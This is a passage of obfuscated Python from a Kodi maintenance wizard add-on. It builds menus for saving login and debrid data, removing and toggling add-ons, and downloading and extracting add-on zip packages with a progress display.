	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2993
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2994
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2995
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2996
	setView ('files','viewType')#line:2997
def loginMenu ():#line:2999
	OOO0OO0000O00O0OO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3000
	OOOOOOO0O0O0000OO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3001
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3002
	addFile ('Save Login Data: %s'%OOO0OO0000O00O0OO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3003
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOOOOO0O0O0000OO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3004
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3005
	for OOO0OO0000O00O0OO in loginit .ORDER :#line:3007
		OO0OOO00O0O0000O0 =LOGINID [OOO0OO0000O00O0OO ]['name']#line:3008
		OO0OOOOOO0O0000O0 =LOGINID [OOO0OO0000O00O0OO ]['path']#line:3009
		O00O00OO00O00OO00 =LOGINID [OOO0OO0000O00O0OO ]['saved']#line:3010
		OOO00OOO00OO00000 =LOGINID [OOO0OO0000O00O0OO ]['file']#line:3011
		OOO0O00OOO00O0O00 =wiz .getS (O00O00OO00O00OO00 )#line:3012
		OOO00O0OO0O00OOOO =loginit .loginUser (OOO0OO0000O00O0OO )#line:3013
		O00000O0O0OOO000O =LOGINID [OOO0OO0000O00O0OO ]['icon']if os .path .exists (OO0OOOOOO0O0000O0 )else ICONLOGIN #line:3014
		OO0O0O000O0OO0OOO =LOGINID [OOO0OO0000O00O0OO ]['fanart']if os .path .exists (OO0OOOOOO0O0000O0 )else FANART #line:3015
		O0OO0O00OO0O0O0O0 =createMenu ('saveaddon','Login',OOO0OO0000O00O0OO )#line:3016
		O0O0O0000OOOOOO00 =createMenu ('save','Login',OOO0OO0000O00O0OO )#line:3017
		O0OO0O00OO0O0O0O0 .append ((THEME2 %'%s Settings'%OO0OOO00O0O0000O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOO0OO0000O00O0OO )))#line:3018
		addFile ('[+]-> %s'%OO0OOO00O0O0000O0 ,'',icon =O00000O0O0OOO000O ,fanart =OO0O0O000O0OO0OOO ,themeit =THEME3 )#line:3020
		if not os .path .exists (OO0OOOOOO0O0000O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00000O0O0OOO000O ,fanart =OO0O0O000O0OO0OOO ,menu =O0OO0O00OO0O0O0O0 )#line:3021
		elif not OOO00O0OO0O00OOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOO0OO0000O00O0OO ,icon =O00000O0O0OOO000O ,fanart =OO0O0O000O0OO0OOO ,menu =O0OO0O00OO0O0O0O0 )#line:3022
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO00O0OO0O00OOOO ,'authlogin',OOO0OO0000O00O0OO ,icon =O00000O0O0OOO000O ,fanart =OO0O0O000O0OO0OOO ,menu =O0OO0O00OO0O0O0O0 )#line:3023
		if OOO0O00OOO00O0O00 =="":#line:3024
			if os .path .exists (OOO00OOO00OO00000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOO0OO0000O00O0OO ,icon =O00000O0O0OOO000O ,fanart =OO0O0O000O0OO0OOO ,menu =O0O0O0000OOOOOO00 )#line:3025
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOO0OO0000O00O0OO ,icon =O00000O0O0OOO000O ,fanart =OO0O0O000O0OO0OOO ,menu =O0O0O0000OOOOOO00 )#line:3026
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0O00OOO00O0O00 ,'',icon =O00000O0O0OOO000O ,fanart =OO0O0O000O0OO0OOO ,menu =O0O0O0000OOOOOO00 )#line:3027
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3029
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3030
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3031
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3032
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3033
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3034
	setView ('files','viewType')#line:3035
def fixUpdate ():#line:3037
	if KODIV <17 :#line:3038
		OOOO0OO000O0O000O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3039
		try :#line:3040
			os .remove (OOOO0OO000O0O000O )#line:3041
		except Exception as O00O0OO000OOOOOO0 :#line:3042
			wiz .log ("Unable to remove %s, Purging DB"%OOOO0OO000O0O000O )#line:3043
			wiz .purgeDb (OOOO0OO000O0O000O )#line:3044
	else :#line:3045
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3046
def removeAddonMenu ():#line:3048
	OOOO0O0O000000O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3049
	O00OOO0O0OOO00OOO =[];OOO000O0O0OOOOOO0 =[]#line:3050
	for OOOO00000OO0OOOOO in sorted (OOOO0O0O000000O0O ,key =lambda O0O0000OO00OO00OO :O0O0000OO00OO00OO ):#line:3051
		O000OOOOOOO00000O =os .path .split (OOOO00000OO0OOOOO [:-1 ])[1 ]#line:3052
		if O000OOOOOOO00000O in EXCLUDES :continue #line:3053
		elif O000OOOOOOO00000O in DEFAULTPLUGINS :continue #line:3054
		elif O000OOOOOOO00000O =='packages':continue #line:3055
		O0000OOO0O00O0000 =os .path .join (OOOO00000OO0OOOOO ,'addon.xml')#line:3056
		if os .path .exists (O0000OOO0O00O0000 ):#line:3057
			OOO0O0OOO00000000 =open (O0000OOO0O00O0000 )#line:3058
			O00O0O0000O0OOO0O =OOO0O0OOO00000000 .read ()#line:3059
			OO0OOOO0O000O0OOO =wiz .parseDOM (O00O0O0000O0OOO0O ,'addon',ret ='id')#line:3060
			OO00OO0OO00OOO0O0 =O000OOOOOOO00000O if len (OO0OOOO0O000O0OOO )==0 else OO0OOOO0O000O0OOO [0 ]#line:3062
			try :#line:3063
				OOOOO00OOOO0OOOO0 =xbmcaddon .Addon (id =OO00OO0OO00OOO0O0 )#line:3064
				O00OOO0O0OOO00OOO .append (OOOOO00OOOO0OOOO0 .getAddonInfo ('name'))#line:3065
				OOO000O0O0OOOOOO0 .append (OO00OO0OO00OOO0O0 )#line:3066
			except :#line:3067
				pass #line:3068
	if len (O00OOO0O0OOO00OOO )==0 :#line:3069
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3070
		return #line:3071
	if KODIV >16 :#line:3072
		OO000OO00OOO00O0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00OOO0O0OOO00OOO )#line:3073
	else :#line:3074
		OO000OO00OOO00O0O =[];O0O00000000OOOOOO =0 #line:3075
		O0OO0OOOO0OO0OOO0 =["-- Click here to Continue --"]+O00OOO0O0OOO00OOO #line:3076
		while not O0O00000000OOOOOO ==-1 :#line:3077
			O0O00000000OOOOOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OO0OOOO0OO0OOO0 )#line:3078
			if O0O00000000OOOOOO ==-1 :break #line:3079
			elif O0O00000000OOOOOO ==0 :break #line:3080
			else :#line:3081
				OOO0OO0O0O0000000 =(O0O00000000OOOOOO -1 )#line:3082
				if OOO0OO0O0O0000000 in OO000OO00OOO00O0O :#line:3083
					OO000OO00OOO00O0O .remove (OOO0OO0O0O0000000 )#line:3084
					O0OO0OOOO0OO0OOO0 [O0O00000000OOOOOO ]=O00OOO0O0OOO00OOO [OOO0OO0O0O0000000 ]#line:3085
				else :#line:3086
					OO000OO00OOO00O0O .append (OOO0OO0O0O0000000 )#line:3087
					O0OO0OOOO0OO0OOO0 [O0O00000000OOOOOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00OOO0O0OOO00OOO [OOO0OO0O0O0000000 ])#line:3088
	if OO000OO00OOO00O0O ==None :return #line:3089
	if len (OO000OO00OOO00O0O )>0 :#line:3090
		wiz .addonUpdates ('set')#line:3091
		for OOOOOOO00000OO0O0 in OO000OO00OOO00O0O :#line:3092
			removeAddon (OOO000O0O0OOOOOO0 [OOOOOOO00000OO0O0 ],O00OOO0O0OOO00OOO [OOOOOOO00000OO0O0 ],True )#line:3093
		xbmc .sleep (1000 )#line:3095
		if INSTALLMETHOD ==1 :OOO0OOO0O0O0OOOO0 =1 #line:3097
		elif INSTALLMETHOD ==2 :OOO0OOO0O0O0OOOO0 =0 #line:3098
		else :OOO0OOO0O0O0OOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3099
		if OOO0OOO0O0O0OOOO0 ==1 :wiz .reloadFix ('remove addon')#line:3100
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3101
def removeAddonDataMenu ():#line:3103
	if os .path .exists (ADDOND ):#line:3104
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3105
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3106
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3107
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3108
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3109
		O000OO0000OO0OOOO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3110
		for OOO00OOOOOOOOOOOO in sorted (O000OO0000OO0OOOO ,key =lambda OOO00000000OO0O0O :OOO00000000OO0O0O ):#line:3111
			OOO0OOOOOOO0OO00O =OOO00OOOOOOOOOOOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3112
			OO0O0OOO00OO0O0O0 =os .path .join (OOO00OOOOOOOOOOOO .replace (ADDOND ,ADDONS ),'icon.png')#line:3113
			O0000OOO0000OO000 =os .path .join (OOO00OOOOOOOOOOOO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3114
			OOOOOOOOO0O0OOO0O =OOO0OOOOOOO0OO00O #line:3115
			O0O0OOOO0O0O0O0O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3116
			for O0OO00O0OO0O00000 in O0O0OOOO0O0O0O0O0 :#line:3117
				OOOOOOOOO0O0OOO0O =OOOOOOOOO0O0OOO0O .replace (O0OO00O0OO0O00000 ,O0O0OOOO0O0O0O0O0 [O0OO00O0OO0O00000 ])#line:3118
			if OOO0OOOOOOO0OO00O in EXCLUDES :OOOOOOOOO0O0OOO0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOOOOOOOO0O0OOO0O #line:3119
			else :OOOOOOOOO0O0OOO0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOOOOOOOO0O0OOO0O #line:3120
			addFile (' %s'%OOOOOOOOO0O0OOO0O ,'removedata',OOO0OOOOOOO0OO00O ,icon =OO0O0OOO00OO0O0O0 ,fanart =O0000OOO0000OO000 ,themeit =THEME2 )#line:3121
	else :#line:3122
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3123
	setView ('files','viewType')#line:3124
def enableAddons ():#line:3126
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3127
	OOO00O0000OO0O00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3128
	OOOOOO0OOOO0OO000 =0 #line:3129
	for OOO0OO0O0000O0O0O in sorted (OOO00O0000OO0O00O ,key =lambda OO000O0O0O0O000OO :OO000O0O0O0O000OO ):#line:3130
		O0O00000OOOO00OOO =os .path .split (OOO0OO0O0000O0O0O [:-1 ])[1 ]#line:3131
		if O0O00000OOOO00OOO in EXCLUDES :continue #line:3132
		if O0O00000OOOO00OOO in DEFAULTPLUGINS :continue #line:3133
		OO0O0O0O000O0O0O0 =os .path .join (OOO0OO0O0000O0O0O ,'addon.xml')#line:3134
		if os .path .exists (OO0O0O0O000O0O0O0 ):#line:3135
			OOOOOO0OOOO0OO000 +=1 #line:3136
			OOO00O0000OO0O00O =OOO0OO0O0000O0O0O .replace (ADDONS ,'')[1 :-1 ]#line:3137
			OO0OO000O0O0OOOO0 =open (OO0O0O0O000O0O0O0 )#line:3138
			OOOO00O0OO00O000O =OO0OO000O0O0OOOO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3139
			OOOO0O0OOO000OO00 =wiz .parseDOM (OOOO00O0OO00O000O ,'addon',ret ='id')#line:3140
			OOO00O000OO000OOO =wiz .parseDOM (OOOO00O0OO00O000O ,'addon',ret ='name')#line:3141
			try :#line:3142
				OOO0O00OOOOOOO0OO =OOOO0O0OOO000OO00 [0 ]#line:3143
				O0000O0OO000O0O00 =OOO00O000OO000OOO [0 ]#line:3144
			except :#line:3145
				continue #line:3146
			try :#line:3147
				OO00O0000O0OOOO0O =xbmcaddon .Addon (id =OOO0O00OOOOOOO0OO )#line:3148
				O0O0OO000O0O000O0 ="[COLOR green][Enabled][/COLOR]"#line:3149
				OOO00OOOOOOO00O00 ="false"#line:3150
			except :#line:3151
				O0O0OO000O0O000O0 ="[COLOR red][Disabled][/COLOR]"#line:3152
				OOO00OOOOOOO00O00 ="true"#line:3153
				pass #line:3154
			O00OO0OOO0O0O0O0O =os .path .join (OOO0OO0O0000O0O0O ,'icon.png')if os .path .exists (os .path .join (OOO0OO0O0000O0O0O ,'icon.png'))else ICON #line:3155
			OOO00O00O00O0O0OO =os .path .join (OOO0OO0O0000O0O0O ,'fanart.jpg')if os .path .exists (os .path .join (OOO0OO0O0000O0O0O ,'fanart.jpg'))else FANART #line:3156
			addFile ("%s %s"%(O0O0OO000O0O000O0 ,O0000O0OO000O0O00 ),'toggleaddon',OOO00O0000OO0O00O ,OOO00OOOOOOO00O00 ,icon =O00OO0OOO0O0O0O0O ,fanart =OOO00O00O00O0O0OO )#line:3157
			OO0OO000O0O0OOOO0 .close ()#line:3158
	if OOOOOO0OOOO0OO000 ==0 :#line:3159
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3160
	setView ('files','viewType')#line:3161
def changeFeq ():#line:3163
	O0O0OO0000OOOO0OO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3164
	OOOOOOO000O00OO00 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0O0OO0000OOOO0OO )#line:3165
	if not OOOOOOO000O00OO00 ==-1 :#line:3166
		wiz .setS ('autocleanfeq',str (OOOOOOO000O00OO00 ))#line:3167
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0O0OO0000OOOO0OO [OOOOOOO000O00OO00 ]))#line:3168
def developer ():#line:3170
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3171
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3172
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3173
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3174
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3175
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3176
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3177
	setView ('files','viewType')#line:3179
def download (OO0OOO00OOO0OOO00 ,O0OOO0O0O00OO0000 ):#line:3184
  OOO00O00000OO00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3185
  O0OO000O00O00O000 =xbmcgui .DialogProgress ()#line:3186
  O0OO000O00O00O000 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3187
  O00O000O00OOOOO0O =os .path .join (OOO00O00000OO00OO ,'isr.zip')#line:3188
  O0O0OOO0O000OO00O =urllib2 .Request (OO0OOO00OOO0OOO00 )#line:3189
  OOO0O000OOO0O0000 =urllib2 .urlopen (O0O0OOO0O000OO00O )#line:3190
  O00O0OOOOO0O0OOOO =xbmcgui .DialogProgress ()#line:3192
  O00O0OOOOO0O0OOOO .create ("Downloading","Downloading "+name )#line:3193
  O00O0OOOOO0O0OOOO .update (0 )#line:3194
  O0OO00O0000000O0O =O0OOO0O0O00OO0000 #line:3195
  OO0O0O0OOO0000O0O =open (O00O000O00OOOOO0O ,'wb')#line:3196
  try :#line:3198
    OO0O0O000O00OO0OO =OOO0O000OOO0O0000 .info ().getheader ('Content-Length').strip ()#line:3199
    OO00O0OOOOO00000O =True #line:3200
  except AttributeError :#line:3201
        OO00O0OOOOO00000O =False #line:3202
  if OO00O0OOOOO00000O :#line:3204
        OO0O0O000O00OO0OO =int (OO0O0O000O00OO0OO )#line:3205
  O00000O0000OO000O =0 #line:3207
  O000O00O00OO00O0O =time .time ()#line:3208
  while True :#line:3209
        OO0OOO000OOO0OO00 =OOO0O000OOO0O0000 .read (8192 )#line:3210
        if not OO0OOO000OOO0OO00 :#line:3211
            sys .stdout .write ('\n')#line:3212
            break #line:3213
        O00000O0000OO000O +=len (OO0OOO000OOO0OO00 )#line:3215
        OO0O0O0OOO0000O0O .write (OO0OOO000OOO0OO00 )#line:3216
        if not OO00O0OOOOO00000O :#line:3218
            OO0O0O000O00OO0OO =O00000O0000OO000O #line:3219
        if O00O0OOOOO0O0OOOO .iscanceled ():#line:3220
           O00O0OOOOO0O0OOOO .close ()#line:3221
           try :#line:3222
            os .remove (O00O000O00OOOOO0O )#line:3223
           except :#line:3224
            pass #line:3225
           break #line:3226
        O0O000OOO000O000O =float (O00000O0000OO000O )/OO0O0O000O00OO0OO #line:3227
        O0O000OOO000O000O =round (O0O000OOO000O000O *100 ,2 )#line:3228
        O00OOOOOOO00O0O00 =O00000O0000OO000O /(1024 *1024 )#line:3229
        OO0000O00O00OO0O0 =OO0O0O000O00OO0OO /(1024 *1024 )#line:3230
        OOOO0O0OO00O00OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OOOOOOO00O0O00 ,'teal',OO0000O00O00OO0O0 )#line:3231
        if (time .time ()-O000O00O00OO00O0O )>0 :#line:3232
          OO0O0O0O00OO00O0O =O00000O0000OO000O /(time .time ()-O000O00O00OO00O0O )#line:3233
          OO0O0O0O00OO00O0O =OO0O0O0O00OO00O0O /1024 #line:3234
        else :#line:3235
         OO0O0O0O00OO00O0O =0 #line:3236
        OOO0OO00OOO0OOOOO ='KB'#line:3237
        if OO0O0O0O00OO00O0O >=1024 :#line:3238
           OO0O0O0O00OO00O0O =OO0O0O0O00OO00O0O /1024 #line:3239
           OOO0OO00OOO0OOOOO ='MB'#line:3240
        if OO0O0O0O00OO00O0O >0 and not O0O000OOO000O000O ==100 :#line:3241
            OOOOO0O0OO0000000 =(OO0O0O000O00OO0OO -O00000O0000OO000O )/OO0O0O0O00OO00O0O #line:3242
        else :#line:3243
            OOOOO0O0OO0000000 =0 #line:3244
        OOO00000000OO0000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O0O0O00OO00O0O ,OOO0OO00OOO0OOOOO )#line:3245
        O00O0OOOOO0O0OOOO .update (int (O0O000OOO000O000O ),"Downloading "+name ,OOOO0O0OO00O00OOO ,OOO00000000OO0000 )#line:3247
  OOOOOOOO0OOOO0OO0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3250
  OO0O0O0OOO0000O0O .close ()#line:3252
  extract (O00O000O00OOOOO0O ,OOOOOOOO0OOOO0OO0 ,O00O0OOOOO0O0OOOO )#line:3254
  if os .path .exists (OOOOOOOO0OOOO0OO0 +'/scakemyer-script.quasar.burst'):#line:3255
    if os .path .exists (OOOOOOOO0OOOO0OO0 +'/script.quasar.burst'):#line:3256
     shutil .rmtree (OOOOOOOO0OOOO0OO0 +'/script.quasar.burst',ignore_errors =False )#line:3257
    os .rename (OOOOOOOO0OOOO0OO0 +'/scakemyer-script.quasar.burst',OOOOOOOO0OOOO0OO0 +'/script.quasar.burst')#line:3258
  if os .path .exists (OOOOOOOO0OOOO0OO0 +'/plugin.video.kmediatorrent-master'):#line:3260
    if os .path .exists (OOOOOOOO0OOOO0OO0 +'/plugin.video.kmediatorrent'):#line:3261
     shutil .rmtree (OOOOOOOO0OOOO0OO0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3262
    os .rename (OOOOOOOO0OOOO0OO0 +'/plugin.video.kmediatorrent-master',OOOOOOOO0OOOO0OO0 +'/plugin.video.kmediatorrent')#line:3263
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3264
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3265
  try :#line:3266
    os .remove (O00O000O00OOOOO0O )#line:3267
  except :#line:3268
    pass #line:3269
  O00O0OOOOO0O0OOOO .close ()#line:3270
def dis_or_enable_addon (O00OOO00O000000O0 ,OO000O000OO0OO0O0 ,enable ="true"):#line:3271
    import json #line:3272
    O000O0OOOO0OO0OOO ='"%s"'%O00OOO00O000000O0 #line:3273
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OOO00O000000O0 )and enable =="true":#line:3274
        logging .warning ('already Enabled')#line:3275
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00OOO00O000000O0 )#line:3276
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OOO00O000000O0 )and enable =="false":#line:3277
        return xbmc .log ("### Skipped %s, reason = not installed"%O00OOO00O000000O0 )#line:3278
    else :#line:3279
        OOOO000OO0O0OO000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000O0OOOO0OO0OOO ,enable )#line:3280
        O00OOOO000OO000OO =xbmc .executeJSONRPC (OOOO000OO0O0OO000 )#line:3281
        OOOO00OOOOOOO000O =json .loads (O00OOOO000OO000OO )#line:3282
        if enable =="true":#line:3283
            xbmc .log ("### Enabled %s, response = %s"%(O00OOO00O000000O0 ,OOOO00OOOOOOO000O ))#line:3284
        else :#line:3285
            xbmc .log ("### Disabled %s, response = %s"%(O00OOO00O000000O0 ,OOOO00OOOOOOO000O ))#line:3286
    if OO000O000OO0OO0O0 =='auto':#line:3287
     return True #line:3288
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3289
def chunk_report (O0OOO0O0OOO0OO0O0 ,OO0000OOOO0O0O000 ,O0000O00O00OO000O ):#line:3290
   OOO00O000O0O0OO0O =float (O0OOO0O0OOO0OO0O0 )/O0000O00O00OO000O #line:3291
   OOO00O000O0O0OO0O =round (OOO00O000O0O0OO0O *100 ,2 )#line:3292
   if O0OOO0O0OOO0OO0O0 >=O0000O00O00OO000O :#line:3294
      sys .stdout .write ('\n')#line:3295
def chunk_read (O00OOOO0000O00000 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3297
   import time #line:3298
   OOO000OO0000O00OO =int (filesize )*1000000 #line:3299
   O0OOO0O0OO0O0O00O =0 #line:3301
   O00O000O00OO0OOO0 =time .time ()#line:3302
   O00O000OOOOO000OO =0 #line:3303
   logging .warning ('Downloading')#line:3305
   with open (destination ,"wb")as O0O0O0OO000OO0OOO :#line:3306
    while 1 :#line:3307
      OOO0OOOO00OO00O0O =time .time ()-O00O000O00OO0OOO0 #line:3308
      O000OOO0000000O0O =int (O00O000OOOOO000OO *chunk_size )#line:3309
      O000O000000O000OO =O00OOOO0000O00000 .read (chunk_size )#line:3310
      O0O0O0OO000OO0OOO .write (O000O000000O000OO )#line:3311
      O0O0O0OO000OO0OOO .flush ()#line:3312
      O0OOO0O0OO0O0O00O +=len (O000O000000O000OO )#line:3313
      O00OO0O0OO00OO0O0 =float (O0OOO0O0OO0O0O00O )/OOO000OO0000O00OO #line:3314
      O00OO0O0OO00OO0O0 =round (O00OO0O0OO00OO0O0 *100 ,2 )#line:3315
      if int (OOO0OOOO00OO00O0O )>0 :#line:3316
        OO00O0OO000O0000O =int (O000OOO0000000O0O /(1024 *OOO0OOOO00OO00O0O ))#line:3317
      else :#line:3318
         OO00O0OO000O0000O =0 #line:3319
      if OO00O0OO000O0000O >1024 and not O00OO0O0OO00OO0O0 ==100 :#line:3320
          O0O0OOOOO00000000 =int (((OOO000OO0000O00OO -O000OOO0000000O0O )/1024 )/(OO00O0OO000O0000O ))#line:3321
      else :#line:3322
          O0O0OOOOO00000000 =0 #line:3323
      if O0O0OOOOO00000000 <0 :#line:3324
        O0O0OOOOO00000000 =0 #line:3325
      dp .update (int (O00OO0O0OO00OO0O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O00OO0O0OO00OO0O0 ,O000OOO0000000O0O /(1024 *1024 ),OOO000OO0000O00OO /(1000 *1000 ),OO00O0OO000O0000O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0OOOOO00000000 ,60 ))#line:3326
      if dp .iscanceled ():#line:3327
         dp .close ()#line:3328
         break #line:3329
      if not O000O000000O000OO :#line:3330
         break #line:3331
      if report_hook :#line:3333
         report_hook (O0OOO0O0OO0O0O00O ,chunk_size ,OOO000OO0000O00OO )#line:3334
      O00O000OOOOO000OO +=1 #line:3335
   logging .warning ('END Downloading')#line:3336
   return O0OOO0O0OO0O0O00O #line:3337
def googledrive_download (O00O0OO00OO0OOO00 ,O000OO0OOO0OOO0O0 ,O0OOO0OOO00O00000 ,OOO0O00O0000OOOO0 ):#line:3339
    OOOO00O00OO0O00OO =[]#line:3343
    O0O0OOO0O0O0OO00O =O00O0OO00OO0OOO00 .split ('=')#line:3344
    O00O0OO00OO0OOO00 =O0O0OOO0O0O0OO00O [len (O0O0OOO0O0O0OO00O )-1 ]#line:3345
    def OO00O0000O000O0OO (O0000000O00OOO0O0 ):#line:3347
        for OO00O0000000OOOOO in O0000000O00OOO0O0 :#line:3349
            logging .warning ('cookie.name')#line:3350
            logging .warning (OO00O0000000OOOOO .name )#line:3351
            OO000O000O0O0O0OO =OO00O0000000OOOOO .value #line:3352
            if 'download_warning'in OO00O0000000OOOOO .name :#line:3353
                logging .warning (OO00O0000000OOOOO .value )#line:3354
                logging .warning ('cookie.value')#line:3355
                return OO00O0000000OOOOO .value #line:3356
            return OO000O000O0O0O0OO #line:3357
        return None #line:3359
    def O0O000OO000O00000 (O000O0O0OO0000O0O ,O0O0O00OOOO00OO0O ):#line:3361
        OO00OO0O0O0OOOO0O =32768 #line:3363
        O0OOOO0OO000O00OO =time .time ()#line:3364
        with open (O0O0O00OOOO00OO0O ,"wb")as OOO000O00O000O0OO :#line:3366
            OO0OOO0OO000O0OOO =1 #line:3367
            O0O00O0OOOOO0O000 =32768 #line:3368
            try :#line:3369
                OOOO00O0OOOO0O0O0 =int (O000O0O0OO0000O0O .headers .get ('content-length'))#line:3370
                print ('file total size :',OOOO00O0OOOO0O0O0 )#line:3371
            except TypeError :#line:3372
                print ('using dummy length !!!')#line:3373
                OOOO00O0OOOO0O0O0 =int (OOO0O00O0000OOOO0 )*1000000 #line:3374
            for OO0OO00000O00O00O in O000O0O0OO0000O0O .iter_content (OO00OO0O0O0OOOO0O ):#line:3375
                if OO0OO00000O00O00O :#line:3376
                    OOO000O00O000O0OO .write (OO0OO00000O00O00O )#line:3377
                    OOO000O00O000O0OO .flush ()#line:3378
                    O0O0OO00O00O0OOO0 =time .time ()-O0OOOO0OO000O00OO #line:3379
                    O0000OOOO0000O0OO =int (OO0OOO0OO000O0OOO *O0O00O0OOOOO0O000 )#line:3380
                    if O0O0OO00O00O0OOO0 ==0 :#line:3381
                        O0O0OO00O00O0OOO0 =0.1 #line:3382
